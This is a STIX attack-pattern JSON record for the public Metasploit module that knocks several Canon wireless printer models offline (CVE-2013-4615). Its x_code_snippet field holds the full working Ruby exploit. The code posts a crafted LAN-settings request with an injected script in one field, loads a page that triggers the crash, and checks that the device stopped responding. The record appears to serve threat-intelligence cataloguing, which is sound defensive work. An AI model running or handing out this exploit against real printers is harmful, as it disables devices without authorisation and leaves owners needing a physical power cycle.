{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1810ac2-ff70-4958-b984-72380d2989ab",
    "created": "2024-08-14T16:25:58.418051Z",
    "modified": "2024-08-14T16:25:58.418055Z",
    "name": "Canon Wireless Printer Denial Of Service",
    "description": " The HTTP management interface on several models of Canon Wireless printers allows for a Denial of Service (DoS) condition via a crafted HTTP request. Note: if this module is successful, the device can only be recovered with a physical power cycle.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/canon_wireless_printer.rb",
            "external_id": "canon_wireless_printer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4615"
        },
        {
            "source_name": "reference",
            "url": "https://www.mattandreko.com/2013/06/canon-y-u-no-security.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Canon Wireless Printer Denial Of Service',\n      'Description'    => %q{\n        The HTTP management interface on several models of Canon Wireless printers\n        allows for a Denial of Service (DoS) condition via a crafted HTTP request. Note:\n        if this module is successful, the device can only be recovered with a physical\n        power cycle.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'Matt \"hostess\" Andreko <mandreko[at]accuvant.com>'\n      ],\n      'References'     => [\n        [ 'CVE', '2013-4615' ],\n        [ 'URL', 'https://www.mattandreko.com/2013/06/canon-y-u-no-security.html']\n      ],\n      'DisclosureDate' => '2013-06-18'))\n  end\n\n  def is_alive?\n    res = send_request_raw({\n      'method'\t=>\t'GET',\n      'uri'\t\t=>\t'/',\n    },10)\n\n    return !res.nil?\n  end\n\n  def run\n\n    begin\n\n      # The first request will set the new IP\n      res = send_request_cgi({\n        'method'\t=>\t'POST',\n        'uri'\t\t=>\t'/English/pages_MacUS/cgi_lan.cgi',\n        'data'\t\t=>\t'OK.x=61' +\n          '&OK.y=12' +\n          '&LAN_OPT1=2' +\n          '&LAN_TXT1=Wireless' +\n          '&LAN_OPT3=1' +\n          '&LAN_TXT21=192' +\n          '&LAN_TXT22=168' +\n          '&LAN_TXT23=1' +\n          '&LAN_TXT24=114\"><script>alert(\\'xss\\');</script>' +\n          '&LAN_TXT31=255' +\n          '&LAN_TXT32=255' +\n          '&LAN_TXT33=255' +\n          '&LAN_TXT34=0' +\n          '&LAN_TXT41=192' +\n          '&LAN_TXT42=168' +\n          '&LAN_TXT43=1' +\n          '&LAN_TXT44=1' +\n          '&LAN_OPT2=4' +\n          '&LAN_OPT4=1' +\n          '&LAN_HID1=1'\n      })\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE\n        print_error(\"Couldn't connect to #{rhost}:#{rport}\")\n      return\n    end\n\n    # The second request will load the network options page, which seems to trigger the DoS\n    send_request_cgi({\n      'method'\t=>\t'GET',\n      'uri'\t\t=>\t'/English/pages_MacUS/lan_set_content.html'\n    },5) #default timeout, we don't care about the response\n\n    # Check to see if it worked or not\n    if is_alive?\n      print_error(\"#{rhost}:#{rport} - Server is still alive\")\n    else\n      print_good(\"#{rhost}:#{rport} - Connection Refused: Success!\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-18"
}